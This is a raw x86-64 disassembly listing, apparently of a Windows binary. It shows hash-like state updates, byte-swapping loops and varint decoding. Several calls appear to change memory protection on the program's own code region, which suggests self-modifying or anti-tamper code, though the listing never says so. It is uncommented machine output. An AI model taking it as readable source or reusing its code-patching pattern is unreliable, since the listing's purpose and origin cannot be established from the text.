   1400416f2:	movaps XMMWORD PTR [rbp+0xd30],xmm6
   1400416f9:	movaps XMMWORD PTR [rbp+0xd20],xmm6
   140041700:	movaps XMMWORD PTR [rbp+0xd10],xmm6
   140041707:	xor    eax,eax
   140041709:	cmp    rax,0x40
   14004170d:	je     0x140041725
   14004170f:	mov    ecx,DWORD PTR [rbp+rax*1+0x710]
   140041716:	bswap  ecx
   140041718:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   14004171f:	add    rax,0x4
   140041723:	jmp    0x140041709
   140041725:	mov    eax,DWORD PTR [rbp+0x7a8]
   14004172b:	mov    DWORD PTR [rbp+0x7d0],eax
   140041731:	mov    rax,QWORD PTR [rbp+0xd08]
   140041738:	mov    DWORD PTR [rbp+0x7d4],eax
   14004173e:	mov    eax,DWORD PTR [rbp+0x1134]
   140041744:	mov    DWORD PTR [rbp+0x7d8],eax
   14004174a:	mov    rax,QWORD PTR [rbp+0xcb8]
   140041751:	mov    DWORD PTR [rbp+0x7dc],eax
   140041757:	mov    eax,DWORD PTR [rbp+0x708]
   14004175d:	mov    DWORD PTR [rbp+0x7e0],eax
   140041763:	and    DWORD PTR [rbp+0x7e4],0x0
   14004176a:	movaps xmm0,XMMWORD PTR [rbp+0xd10]
   140041771:	movaps xmm1,XMMWORD PTR [rbp+0xd20]
   140041778:	movaps xmm2,XMMWORD PTR [rbp+0xd30]
   14004177f:	movaps xmm3,XMMWORD PTR [rbp+0xd40]
   140041786:	lea    rax,[rbp+0x7e8]
   14004178d:	movups XMMWORD PTR [rax+0x30],xmm3
   140041791:	movups XMMWORD PTR [rax+0x20],xmm2
   140041795:	movups XMMWORD PTR [rax+0x10],xmm1
   140041799:	movups XMMWORD PTR [rax],xmm0
   14004179c:	call   0x140064214
   1400417a1:	mov    al,BYTE PTR [rip+0x572e6]        # 0x140098a8d
   1400417a7:	cmp    al,0x1
   1400417a9:	je     0x1400417f2
   1400417ab:	movzx  eax,al
   1400417ae:	cmp    eax,0x2
   1400417b1:	je     0x1400418ba
   1400417b7:	and    DWORD PTR [rbp+0xf80],0x0
   1400417be:	lea    rcx,[rip+0xfffffffffffbf8bb]        # 0x140001080
   1400417c5:	mov    rdx,QWORD PTR [rbp+0x1150]
   1400417cc:	push   0x40
   1400417ce:	pop    r8
   1400417d0:	lea    r9,[rbp+0xf80]
   1400417d7:	call   QWORD PTR [rip+0x5302b]        # 0x140094808
   1400417dd:	test   eax,eax
   1400417df:	sete   cl
   1400417e2:	inc    cl
   1400417e4:	mov    BYTE PTR [rip+0x572a3],cl        # 0x140098a8d
   1400417ea:	test   eax,eax
   1400417ec:	je     0x1400418ba
   1400417f2:	mov    al,BYTE PTR [rip+0x573c0]        # 0x140098bb8
   1400417f8:	cmp    al,0x1
   1400417fa:	je     0x140041823
   1400417fc:	movzx  eax,al
   1400417ff:	test   eax,eax
   140041801:	jne    0x1400418ba
   140041807:	call   0x140065d51
   14004180c:	test   rax,rax
   14004180f:	sete   cl
   140041812:	inc    cl
   140041814:	mov    BYTE PTR [rip+0x5739e],cl        # 0x140098bb8
   14004181a:	test   rax,rax
   14004181d:	je     0x1400418ba
   140041823:	call   0x140064227
   140041828:	mov    eax,0xc8c291de
   14004182d:	xchg   DWORD PTR [rip+0x572ad],eax        # 0x140098ae0
   140041833:	call   QWORD PTR [rip+0x52e17]        # 0x140094650
   140041839:	mov    eax,eax
   14004183b:	mov    QWORD PTR [rip+0x567be],rax        # 0x140098000
   140041842:	mov    rcx,r13
   140041845:	push   0xffffffffffffffff
   140041847:	pop    rdx
   140041848:	call   0x140010840
   14004184d:	xor    eax,eax
   14004184f:	xchg   DWORD PTR [rip+0x5728b],eax        # 0x140098ae0
   140041855:	mov    BYTE PTR [rip+0x57232],0x0        # 0x140098a8e
   14004185c:	mov    eax,DWORD PTR [rbp+0x7a8]
   140041862:	add    eax,DWORD PTR [rbp+0x7d0]
   140041868:	mov    DWORD PTR [rbp+0x7a8],eax
   14004186e:	mov    rax,QWORD PTR [rbp+0xd08]
   140041875:	add    eax,DWORD PTR [rbp+0x7d4]
   14004187b:	mov    QWORD PTR [rbp+0xd08],rax
   140041882:	mov    eax,DWORD PTR [rbp+0x1134]
   140041888:	add    eax,DWORD PTR [rbp+0x7d8]
   14004188e:	mov    DWORD PTR [rbp+0x1134],eax
   140041894:	mov    rax,QWORD PTR [rbp+0xcb8]
   14004189b:	add    eax,DWORD PTR [rbp+0x7dc]
   1400418a1:	mov    QWORD PTR [rbp+0xcb8],rax
   1400418a8:	mov    eax,DWORD PTR [rbp+0x708]
   1400418ae:	add    eax,DWORD PTR [rbp+0x7e0]
   1400418b4:	mov    DWORD PTR [rbp+0x708],eax
   1400418ba:	mov    BYTE PTR [rip+0x571cb],0x0        # 0x140098a8c
   1400418c1:	mov    rax,QWORD PTR [rbp+0x6c0]
   1400418c8:	jmp    0x14003d5aa
   1400418cd:	mov    r13d,DWORD PTR [rbp+0x1134]
   1400418d4:	cmp    QWORD PTR [rbp+0x6d8],0x8
   1400418dc:	jae    0x1400418f1
   1400418de:	mov    rax,QWORD PTR [rbp+0xcb8]
   1400418e5:	shl    rax,0x20
   1400418e9:	or     r13,rax
   1400418ec:	jmp    0x1400419df
   1400418f1:	mov    rax,QWORD PTR [rbp+0xd08]
   1400418f8:	shl    rax,0x20
   1400418fc:	mov    edx,DWORD PTR [rbp+0x7a8]
   140041902:	or     rdx,rax
   140041905:	mov    rax,QWORD PTR [rbp+0xcb8]
   14004190c:	shl    rax,0x20
   140041910:	or     r13,rax
   140041913:	mov    rax,r13
   140041916:	rol    rax,0x11
   14004191a:	mov    rsi,QWORD PTR [rbp+0x6d8]
   140041921:	lea    r8,[rsi-0x7]
   140041925:	mov    ecx,DWORD PTR [rbp+0x708]
   14004192b:	xor    rcx,rdx
   14004192e:	xor    rcx,rax
   140041931:	and    QWORD PTR [rbp+0x7d0],0x0
   140041939:	xor    r9d,r9d
   14004193c:	mov    rdi,QWORD PTR [rbp+0x608]
   140041943:	movabs rbx,0xf8714df9dba9a23d
   14004194d:	cmp    r9,0x2aea540
   140041954:	je     0x1400419c5
   140041956:	mov    r10,rcx
   140041959:	shr    r10,0x20
   14004195d:	imul   r10,r8
   140041961:	shr    r10,0x20
   140041965:	lea    rax,[r10+0x8]
   140041969:	cmp    rax,rsi
   14004196c:	jbe    0x140041990
   14004196e:	xor    r11d,r11d
   140041971:	cmp    r11,0x8
   140041975:	je     0x1400419ab
   140041977:	lea    rax,[r10+r11*1]
   14004197b:	xor    edx,edx
   14004197d:	div    rsi
   140041980:	mov    al,BYTE PTR [rdi+rdx*1]
   140041983:	mov    BYTE PTR [rbp+r11*1+0x7d0],al
   14004198b:	inc    r11
   14004198e:	jmp    0x140041971
   140041990:	add    r10,rdi
   140041993:	xor    eax,eax
   140041995:	cmp    rax,0x8
   140041999:	je     0x1400419ab
   14004199b:	mov    dl,BYTE PTR [r10+rax*1]
   14004199f:	mov    BYTE PTR [rbp+rax*1+0x7d0],dl
   1400419a6:	inc    rax
   1400419a9:	jmp    0x140041995
   1400419ab:	xor    rcx,QWORD PTR [rbp+0x7d0]
   1400419b2:	imul   rcx,rbx
   1400419b6:	mov    rax,rcx
   1400419b9:	shr    rax,0x1d
   1400419bd:	xor    rcx,rax
   1400419c0:	inc    r9
   1400419c3:	jmp    0x14004194d
   1400419c5:	xor    DWORD PTR [rbp+0x7a8],ecx
   1400419cb:	shr    rcx,0x20
   1400419cf:	mov    rax,QWORD PTR [rbp+0xd08]
   1400419d6:	xor    eax,ecx
   1400419d8:	mov    QWORD PTR [rbp+0xd08],rax
   1400419df:	mov    rax,QWORD PTR [rbp+0x3d0]
   1400419e6:	mov    QWORD PTR [rbp+0x3f0],rax
   1400419ed:	mov    rcx,QWORD PTR [rbp+0x6d0]
   1400419f4:	mov    rdx,QWORD PTR [rbp+0x6a0]
   1400419fb:	call   0x14006f7f7
   140041a00:	mov    eax,DWORD PTR [rbp+0x7a8]
   140041a06:	mov    DWORD PTR [rbp+0x1a8],eax
   140041a0c:	mov    rax,QWORD PTR [rbp+0xd08]
   140041a13:	mov    DWORD PTR [rbp+0x1ac],eax
   140041a19:	mov    QWORD PTR [rbp+0x1b0],r13
   140041a20:	mov    eax,DWORD PTR [rbp+0x708]
   140041a26:	mov    DWORD PTR [rbp+0x1b8],eax
   140041a2c:	xorps  xmm0,xmm0
   140041a2f:	lea    rsi,[rbp+0x1060]
   140041a36:	movaps XMMWORD PTR [rsi+0x30],xmm0
   140041a3a:	movaps XMMWORD PTR [rsi+0x20],xmm0
   140041a3e:	movaps XMMWORD PTR [rsi+0x10],xmm0
   140041a42:	movaps XMMWORD PTR [rsi],xmm0
   140041a45:	xor    r15d,r15d
   140041a48:	lea    rdi,[rip+0x46701]        # 0x140088150
   140041a4f:	lea    rbx,[rbp+0x7d0]
   140041a56:	push   0x4
   140041a58:	pop    r14
   140041a5a:	cmp    r15,0x14
   140041a5e:	je     0x140041aa2
   140041a60:	lea    r12,[r15+0x4]
   140041a64:	mov    rcx,r15
   140041a67:	mov    rdx,r12
   140041a6a:	mov    r8,rsi
   140041a6d:	mov    r9,rdi
   140041a70:	call   0x14003ad60
   140041a75:	mov    ecx,DWORD PTR [rbp+r15*1+0x1a8]
   140041a7d:	mov    DWORD PTR [rbp+0x7d0],ecx
   140041a83:	lea    rcx,[rip+0x466de]        # 0x140088168
   140041a8a:	mov    QWORD PTR [rsp+0x20],rcx
   140041a8f:	mov    rcx,rax
   140041a92:	mov    r8,rbx
   140041a95:	mov    r9,r14
   140041a98:	call   0x1400638fe
   140041a9d:	mov    r15,r12
   140041aa0:	jmp    0x140041a5a
   140041aa2:	xorps  xmm0,xmm0
   140041aa5:	movaps XMMWORD PTR [rbp+0xd40],xmm0
   140041aac:	movaps XMMWORD PTR [rbp+0xd30],xmm0
   140041ab3:	movaps XMMWORD PTR [rbp+0xd20],xmm0
   140041aba:	movaps XMMWORD PTR [rbp+0xd10],xmm0
   140041ac1:	xor    eax,eax
   140041ac3:	cmp    rax,0x40
   140041ac7:	je     0x140041adf
   140041ac9:	mov    ecx,DWORD PTR [rbp+rax*1+0x1060]
   140041ad0:	bswap  ecx
   140041ad2:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   140041ad9:	add    rax,0x4
   140041add:	jmp    0x140041ac3
   140041adf:	mov    eax,DWORD PTR [rbp+0x7a8]
   140041ae5:	mov    DWORD PTR [rbp+0x7d0],eax
   140041aeb:	mov    rax,QWORD PTR [rbp+0xd08]
   140041af2:	mov    DWORD PTR [rbp+0x7d4],eax
   140041af8:	mov    QWORD PTR [rbp+0x7d8],r13
   140041aff:	mov    eax,DWORD PTR [rbp+0x708]
   140041b05:	mov    DWORD PTR [rbp+0x7e0],eax
   140041b0b:	and    DWORD PTR [rbp+0x7e4],0x0
   140041b12:	movaps xmm0,XMMWORD PTR [rbp+0xd10]
   140041b19:	movaps xmm1,XMMWORD PTR [rbp+0xd20]
   140041b20:	movaps xmm2,XMMWORD PTR [rbp+0xd30]
   140041b27:	movaps xmm3,XMMWORD PTR [rbp+0xd40]
   140041b2e:	movups XMMWORD PTR [rbp+0x7e8],xmm0
   140041b35:	movups XMMWORD PTR [rbp+0x7f8],xmm1
   140041b3c:	movups XMMWORD PTR [rbp+0x808],xmm2
   140041b43:	movups XMMWORD PTR [rbp+0x818],xmm3
   140041b4a:	call   0x140064214
   140041b4f:	mov    al,BYTE PTR [rip+0x56f38]        # 0x140098a8d
   140041b55:	mov    DWORD PTR [rbp+0x5f0],0x0
   140041b5f:	cmp    al,0x1
   140041b61:	je     0x140041ba7
   140041b63:	movzx  eax,al
   140041b66:	cmp    eax,0x2
   140041b69:	je     0x140041c8c
   140041b6f:	lea    r9,[rbp+0xf80]
   140041b76:	and    DWORD PTR [r9],0x0
   140041b7a:	push   0x40
   140041b7c:	pop    r8
   140041b7e:	lea    rcx,[rip+0xfffffffffffbf4fb]        # 0x140001080
   140041b85:	mov    rdx,QWORD PTR [rbp+0x1150]
   140041b8c:	call   QWORD PTR [rip+0x52c76]        # 0x140094808
   140041b92:	test   eax,eax
   140041b94:	sete   cl
   140041b97:	inc    cl
   140041b99:	mov    BYTE PTR [rip+0x56eee],cl        # 0x140098a8d
   140041b9f:	test   eax,eax
   140041ba1:	je     0x140041c8c
   140041ba7:	mov    al,BYTE PTR [rip+0x5700b]        # 0x140098bb8
   140041bad:	cmp    al,0x1
   140041baf:	je     0x140041c00
   140041bb1:	movzx  eax,al
   140041bb4:	test   eax,eax
   140041bb6:	jne    0x140041c8c
   140041bbc:	call   0x140065d51
   140041bc1:	test   rax,rax
   140041bc4:	sete   cl
   140041bc7:	inc    cl
   140041bc9:	mov    BYTE PTR [rip+0x56fe9],cl        # 0x140098bb8
   140041bcf:	mov    DWORD PTR [rbp+0xcb8],0x0
   140041bd9:	mov    DWORD PTR [rbp+0x6c0],0x0
   140041be3:	mov    DWORD PTR [rbp+0x1134],0x0
   140041bed:	mov    DWORD PTR [rbp+0x6c8],0x0
   140041bf7:	test   rax,rax
   140041bfa:	je     0x140041cb4
   140041c00:	mov    edi,r13d
   140041c03:	shr    r13,0x20
   140041c07:	call   0x140064227
   140041c0c:	mov    eax,0xc8c291de
   140041c11:	xchg   DWORD PTR [rip+0x56ec9],eax        # 0x140098ae0
   140041c17:	call   QWORD PTR [rip+0x52a33]        # 0x140094650
   140041c1d:	mov    eax,eax
   140041c1f:	mov    QWORD PTR [rip+0x563da],rax        # 0x140098000
   140041c26:	lea    rsi,[rbp+0x7d0]
   140041c2d:	push   0xffffffffffffffff
   140041c2f:	pop    rdx
   140041c30:	mov    rcx,rsi
   140041c33:	call   0x140001080
   140041c38:	xor    eax,eax
   140041c3a:	xchg   DWORD PTR [rip+0x56ea0],eax        # 0x140098ae0
   140041c40:	mov    BYTE PTR [rip+0x56e47],0x0        # 0x140098a8e
   140041c47:	mov    ecx,DWORD PTR [rbp+0x7a8]
   140041c4d:	add    ecx,DWORD PTR [rsi]
   140041c4f:	mov    rdx,QWORD PTR [rbp+0xd08]
   140041c56:	add    edx,DWORD PTR [rsi+0x4]
   140041c59:	mov    eax,DWORD PTR [rsi+0x8]
   140041c5c:	add    eax,edi
   140041c5e:	mov    DWORD PTR [rbp+0x6c0],eax
   140041c64:	add    r13d,DWORD PTR [rsi+0xc]
   140041c68:	mov    eax,DWORD PTR [rbp+0x708]
   140041c6e:	add    eax,DWORD PTR [rsi+0x10]
   140041c71:	mov    DWORD PTR [rbp+0x5f0],eax
   140041c77:	mov    DWORD PTR [rbp+0xcb8],r13d
   140041c7e:	mov    DWORD PTR [rbp+0x1134],edx
   140041c84:	mov    DWORD PTR [rbp+0x6c8],ecx
   140041c8a:	jmp    0x140041cb4
   140041c8c:	mov    DWORD PTR [rbp+0xcb8],0x0
   140041c96:	mov    DWORD PTR [rbp+0x6c0],0x0
   140041ca0:	mov    DWORD PTR [rbp+0x1134],0x0
   140041caa:	mov    DWORD PTR [rbp+0x6c8],0x0
   140041cb4:	mov    BYTE PTR [rip+0x56dd1],0x0        # 0x140098a8c
   140041cbb:	mov    rsi,QWORD PTR [rbp+0x200]
   140041cc2:	lea    rcx,[rip+0x3dd87]        # 0x14007fa50
   140041cc9:	mov    edx,0x4000
   140041cce:	call   0x14003bee8
   140041cd3:	mov    rdi,rdx
   140041cd6:	sub    rdi,0x10
   140041cda:	jb     0x14003cad1
   140041ce0:	mov    r12,rax
   140041ce3:	lea    rax,[rsi-0x41]
   140041ce7:	cmp    rax,0xffffffffffffffc0
   140041ceb:	setb   al
   140041cee:	test   rdi,rdi
   140041cf1:	sete   cl
   140041cf4:	or     cl,al
   140041cf6:	jne    0x14003cad1
   140041cfc:	lea    rbx,[rbp+0x208]
   140041d03:	mov    QWORD PTR [rbp+0x1170],r12
   140041d0a:	add    r12,0x10
   140041d0e:	lea    r15,[rbp+0x85c]
   140041d15:	lea    r14,[rbp+0x3b0]
   140041d1c:	mov    rcx,r15
   140041d1f:	mov    rdx,r14
   140041d22:	call   0x14003ad8d
   140041d27:	mov    rcx,r12
   140041d2a:	mov    rdx,rdi
   140041d2d:	call   0x14003adcf
   140041d32:	mul    rsi
   140041d35:	mov    r8,rax
   140041d38:	push   0xffffffffffffffff
   140041d3a:	pop    rax
   140041d3b:	cmovo  r8,rax
   140041d3f:	xor    edx,edx
   140041d41:	mov    QWORD PTR [rbp+0x1180],r12
   140041d48:	mov    QWORD PTR [r15-0x8c],r12
   140041d4f:	lea    rcx,[rbp+0x7d8]
   140041d56:	mov    QWORD PTR [rcx],rdi
   140041d59:	mov    QWORD PTR [rcx+0x8],rsi
   140041d5d:	mov    rax,QWORD PTR [rbx+0x20]
   140041d61:	mov    QWORD PTR [rcx+0x30],rax
   140041d65:	mov    rax,r8
   140041d68:	sub    rax,0x20
   140041d6c:	cmovb  rax,rdx
   140041d70:	mov    QWORD PTR [rbp+0x1158],rax
   140041d77:	movups xmm0,XMMWORD PTR [rbx]
   140041d7a:	movups xmm1,XMMWORD PTR [rbx+0x10]
   140041d7e:	movups XMMWORD PTR [rcx+0x10],xmm0
   140041d82:	movups XMMWORD PTR [rcx+0x20],xmm1
   140041d86:	xorps  xmm6,xmm6
   140041d89:	and    QWORD PTR [rcx+0x48],0x0
   140041d8e:	movaps XMMWORD PTR [rcx+0x38],xmm6
   140041d92:	mov    QWORD PTR [rcx+0x50],rdi
   140041d96:	mov    rax,QWORD PTR [rbp+0x600]
   140041d9d:	mov    QWORD PTR [rcx+0x58],rax
   140041da1:	mov    rax,QWORD PTR [rbp+0x4f0]
   140041da8:	mov    QWORD PTR [rcx+0x60],rax
   140041dac:	mov    rax,QWORD PTR [rbp+0x7b8]
   140041db3:	mov    QWORD PTR [rcx+0x68],rax
   140041db7:	movaps xmm0,XMMWORD PTR [r14]
   140041dbb:	mov    eax,DWORD PTR [r14+0x10]
   140041dbf:	mov    DWORD PTR [r15-0x4],eax
   140041dc3:	movups XMMWORD PTR [rcx+0x70],xmm0
   140041dc7:	movaps XMMWORD PTR [r15+0x14],xmm6
   140041dcc:	movaps XMMWORD PTR [r15+0x24],xmm6
   140041dd1:	mov    QWORD PTR [rbp+0x1168],r8
   140041dd8:	mov    QWORD PTR [r15+0x34],r8
   140041ddc:	lea    rcx,[rbp+0x500]
   140041de3:	push   0x4
   140041de5:	pop    rdx
   140041de6:	call   0x14003c111
   140041deb:	push   0x14
   140041ded:	pop    r13
   140041def:	xor    r14d,r14d
   140041df2:	xor    ebx,ebx
   140041df4:	xor    r15d,r15d
   140041df7:	xor    edi,edi
   140041df9:	xor    r12d,r12d
   140041dfc:	mov    QWORD PTR [rbp+0x1178],0x0
   140041e07:	mov    rcx,QWORD PTR [rbp+0x1178]
   140041e0e:	cmp    rcx,0x4
   140041e12:	mov    r9,QWORD PTR [rbp+0x1168]
   140041e19:	je     0x140042419
   140041e1f:	lea    rax,[r12+0x8]
   140041e24:	cmp    rax,r9
   140041e27:	jbe    0x140041e30
   140041e29:	xor    edx,edx
   140041e2b:	jmp    0x1400423fe
   140041e30:	xor    r8d,r8d
   140041e33:	cmp    rdi,0x8
   140041e37:	jae    0x14004237e
   140041e3d:	cmp    r14,QWORD PTR [rbp+0x828]
   140041e44:	jae    0x140041e94
   140041e46:	mov    rax,QWORD PTR [rbp+0x7d8]
   140041e4d:	mov    rcx,QWORD PTR [rbp+0x818]
   140041e54:	cmp    rcx,rax
   140041e57:	jae    0x140041e94
   140041e59:	mov    rdx,QWORD PTR [rbp+0x1180]
   140041e60:	movzx  r15d,BYTE PTR [rdx+rcx*1]
   140041e65:	and    r15d,0x7f
   140041e69:	mov    r9,QWORD PTR [rbp+0x1170]
   140041e70:	lea    rdx,[rcx+0x1]
   140041e74:	cmp    rdx,rax
   140041e77:	jae    0x140041ea1
   140041e79:	movzx  r8d,BYTE PTR [r9+rcx*1+0x11]
   140041e7f:	test   r8b,r8b
   140041e82:	jns    0x140041e9b
   140041e84:	shl    r15,0x7
   140041e88:	and    r8d,0x7f
   140041e8c:	or     r15,r8
   140041e8f:	mov    rcx,rdx
   140041e92:	jmp    0x140041e70
   140041e94:	xor    edx,edx
   140041e96:	jmp    0x140042317
   140041e9b:	inc    rcx
   140041e9e:	mov    rax,rcx
   140041ea1:	mov    QWORD PTR [rbp+0x818],rax
   140041ea8:	mov    rax,r15
   140041eab:	shr    rax,0x8
   140041eaf:	mov    rsi,r15
   140041eb2:	shr    rsi,0x28
   140041eb6:	movaps XMMWORD PTR [rbp+0xfb0],xmm6
   140041ebd:	movaps XMMWORD PTR [rbp+0xfa0],xmm6
   140041ec4:	movaps XMMWORD PTR [rbp+0xf90],xmm6
   140041ecb:	movaps XMMWORD PTR [rbp+0xf80],xmm6
   140041ed2:	mov    DWORD PTR [rbp+0xd10],eax
   140041ed8:	lea    rax,[rip+0x46179]        # 0x140088058
   140041edf:	mov    QWORD PTR [rsp+0x20],rax
   140041ee4:	lea    rcx,[rbp+0xf80]
   140041eeb:	push   0x4
   140041eed:	pop    rdx
   140041eee:	lea    r8,[rbp+0xd10]
   140041ef5:	mov    r9,rdx
   140041ef8:	call   0x1400638fe
   140041efd:	mov    BYTE PTR [rbp+0xf84],sil
   140041f04:	mov    rsi,QWORD PTR [rbp+0x7f0]
   140041f0b:	cmp    QWORD PTR [rbp+0x838],rsi
   140041f12:	jbe    0x14004203e
   140041f18:	mov    r9,QWORD PTR [rbp+0x7f8]
   140041f1f:	cmp    r9,0x4
   140041f23:	ja     0x140059d9c
   140041f29:	mov    rcx,QWORD PTR [rbp+0x800]
   140041f30:	cmp    rcx,0x5
   140041f34:	jae    0x140059dae
   140041f3a:	mov    rbx,QWORD PTR [rbp+0x838]
   140041f41:	cmp    rbx,rsi
   140041f44:	je     0x140059dbc
   140041f4a:	mov    r8,rbx
   140041f4d:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   140041f54:	mov    cl,BYTE PTR [rbp+0x808]
   140041f5a:	rol    eax,cl
   140041f5c:	sub    r8,rsi
   140041f5f:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   140041f67:	xor    edx,edx
   140041f69:	div    r8
   140041f6c:	mov    rdi,rdx
   140041f6f:	mov    rax,QWORD PTR [rbp+0x840]
   140041f76:	mov    QWORD PTR [rbp+0x1060],rax
   140041f7d:	cmp    rsi,0x40
   140041f81:	push   0x40
   140041f83:	pop    rax
   140041f84:	cmovae rsi,rax
   140041f88:	movaps XMMWORD PTR [rbp+0xd40],xmm6
   140041f8f:	movaps XMMWORD PTR [rbp+0xd30],xmm6
   140041f96:	movaps XMMWORD PTR [rbp+0xd20],xmm6
   140041f9d:	movaps XMMWORD PTR [rbp+0xd10],xmm6
   140041fa4:	lea    rcx,[rbp+0xd10]
   140041fab:	mov    rdx,rsi
   140041fae:	call   0x14003c0b8
   140041fb3:	test   rbx,rbx
   140041fb6:	je     0x140042004
   140041fb8:	mov    rcx,rax
   140041fbb:	mov    r8,rdx
   140041fbe:	mov    rax,rdx
   140041fc1:	add    rax,rdi
   140041fc4:	mov    r9,QWORD PTR [rbp+0x830]
   140041fcb:	cmp    rax,rbx
   140041fce:	jbe    0x140041fee
   140041fd0:	xor    r10d,r10d
   140041fd3:	cmp    r8,r10
   140041fd6:	je     0x140042004
   140041fd8:	lea    rax,[r10+rdi*1]
   140041fdc:	xor    edx,edx
   140041fde:	div    rbx
   140041fe1:	mov    al,BYTE PTR [r9+rdx*1]
   140041fe5:	mov    BYTE PTR [rcx+r10*1],al
   140041fe9:	inc    r10
   140041fec:	jmp    0x140041fd3
   140041fee:	add    r9,rdi
   140041ff1:	xor    eax,eax
   140041ff3:	cmp    r8,rax
   140041ff6:	je     0x140042004
   140041ff8:	mov    dl,BYTE PTR [r9+rax*1]
   140041ffc:	mov    BYTE PTR [rcx+rax*1],dl
   140041fff:	inc    rax
   140042002:	jmp    0x140041ff3
   140042004:	mov    rcx,QWORD PTR [rbp+0x7e8]
   14004200b:	xor    eax,eax
   14004200d:	cmp    rsi,rax
   140042010:	je     0x14004203e
   140042012:	cmp    rcx,0x3f
   140042016:	ja     0x140059d8e
   14004201c:	mov    edx,eax
   14004201e:	and    edx,0x7
   140042021:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   140042028:	xor    dl,BYTE PTR [rbp+rax*1+0xd10]
   14004202f:	inc    rax
   140042032:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   140042039:	inc    rcx
   14004203c:	jmp    0x14004200d
   14004203e:	movaps XMMWORD PTR [rbp+0x1090],xmm6
   140042045:	movaps XMMWORD PTR [rbp+0x1080],xmm6
   14004204c:	movaps XMMWORD PTR [rbp+0x1070],xmm6
   140042053:	movaps XMMWORD PTR [rbp+0x1060],xmm6
   14004205a:	xor    eax,eax
   14004205c:	cmp    rax,0x40
   140042060:	je     0x140042078
   140042062:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   140042069:	bswap  ecx
   14004206b:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   140042072:	add    rax,0x4
   140042076:	jmp    0x14004205c
   140042078:	movups xmm0,XMMWORD PTR [rbp+0x848]
   14004207f:	mov    eax,DWORD PTR [rbp+0x858]
   140042085:	movups XMMWORD PTR [rbp+0xd10],xmm0
   14004208c:	mov    DWORD PTR [rbp+0xd20],eax
   140042092:	and    DWORD PTR [rbp+0xd24],0x0
   140042099:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   1400420a0:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   1400420a7:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   1400420ae:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   1400420b5:	lea    rax,[rbp+0xd28]
   1400420bc:	movups XMMWORD PTR [rax+0x30],xmm3
   1400420c0:	movups XMMWORD PTR [rax+0x20],xmm2
   1400420c4:	movups XMMWORD PTR [rax+0x10],xmm1
   1400420c8:	movups XMMWORD PTR [rax],xmm0
   1400420cb:	call   0x140064214
   1400420d0:	mov    al,BYTE PTR [rip+0x569b7]        # 0x140098a8d
   1400420d6:	cmp    al,0x1
   1400420d8:	je     0x140042121
   1400420da:	movzx  eax,al
   1400420dd:	cmp    eax,0x2
   1400420e0:	je     0x1400421c7
   1400420e6:	and    DWORD PTR [rbp+0x400],0x0
   1400420ed:	lea    rcx,[rip+0xfffffffffffbef8c]        # 0x140001080
   1400420f4:	mov    rdx,QWORD PTR [rbp+0x1150]
   1400420fb:	push   0x40
   1400420fd:	pop    r8
   1400420ff:	lea    r9,[rbp+0x400]
   140042106:	call   QWORD PTR [rip+0x526fc]        # 0x140094808
   14004210c:	test   eax,eax
   14004210e:	sete   cl
   140042111:	inc    cl
   140042113:	mov    BYTE PTR [rip+0x56974],cl        # 0x140098a8d
   140042119:	test   eax,eax
   14004211b:	je     0x1400421c7
   140042121:	mov    al,BYTE PTR [rip+0x56a91]        # 0x140098bb8
   140042127:	cmp    al,0x1
   140042129:	je     0x14004214e
   14004212b:	movzx  eax,al
   14004212e:	test   eax,eax
   140042130:	jne    0x1400421c7
   140042136:	call   0x140065d51
   14004213b:	test   rax,rax
   14004213e:	sete   cl
   140042141:	inc    cl
   140042143:	mov    BYTE PTR [rip+0x56a6f],cl        # 0x140098bb8
   140042149:	test   rax,rax
   14004214c:	je     0x1400421c7
   14004214e:	call   0x140064227
   140042153:	mov    eax,0xc8c291de
   140042158:	xchg   DWORD PTR [rip+0x56982],eax        # 0x140098ae0
   14004215e:	call   QWORD PTR [rip+0x524ec]        # 0x140094650
   140042164:	mov    eax,eax
   140042166:	mov    QWORD PTR [rip+0x55e93],rax        # 0x140098000
   14004216d:	lea    rcx,[rbp+0xd10]
   140042174:	push   0xffffffffffffffff
   140042176:	pop    rdx
   140042177:	call   0x14002b840
   14004217c:	xor    eax,eax
   14004217e:	xchg   DWORD PTR [rip+0x5695c],eax        # 0x140098ae0
   140042184:	mov    BYTE PTR [rip+0x56903],0x0        # 0x140098a8e
   14004218b:	mov    eax,DWORD PTR [rbp+0xd10]
   140042191:	add    DWORD PTR [rbp+0x848],eax
   140042197:	mov    eax,DWORD PTR [rbp+0xd14]
   14004219d:	add    DWORD PTR [rbp+0x84c],eax
   1400421a3:	mov    eax,DWORD PTR [rbp+0xd18]
   1400421a9:	add    DWORD PTR [rbp+0x850],eax
   1400421af:	mov    eax,DWORD PTR [rbp+0xd1c]
   1400421b5:	add    DWORD PTR [rbp+0x854],eax
   1400421bb:	mov    eax,DWORD PTR [rbp+0xd20]
   1400421c1:	add    DWORD PTR [rbp+0x858],eax
   1400421c7:	mov    BYTE PTR [rip+0x568be],0x0        # 0x140098a8c
   1400421ce:	movaps XMMWORD PTR [rbp+0xd30],xmm6
   1400421d5:	movaps XMMWORD PTR [rbp+0xd20],xmm6
   1400421dc:	movaps XMMWORD PTR [rbp+0xd10],xmm6
   1400421e3:	xor    eax,eax
   1400421e5:	cmp    rax,0x14
   1400421e9:	je     0x140042201
   1400421eb:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   1400421f2:	bswap  ecx
   1400421f4:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   1400421fb:	add    rax,0x4
   1400421ff:	jmp    0x1400421e5
   140042201:	mov    rsi,QWORD PTR [rbp+0x7e0]
   140042208:	mov    eax,r15d
   14004220b:	shr    eax,0x3
   14004220e:	and    eax,0x1f
   140042211:	lea    rcx,[rax+rbp*1]
   140042215:	add    rcx,0xd10
   14004221c:	xor    r8d,r8d
   14004221f:	xor    edx,edx
   140042221:	xor    eax,eax
   140042223:	cmp    r8,0x10
   140042227:	je     0x140042242
   140042229:	shld   rax,rdx,0x8
   14004222e:	mov    r9,rdx
   140042231:	shl    r9,0x8
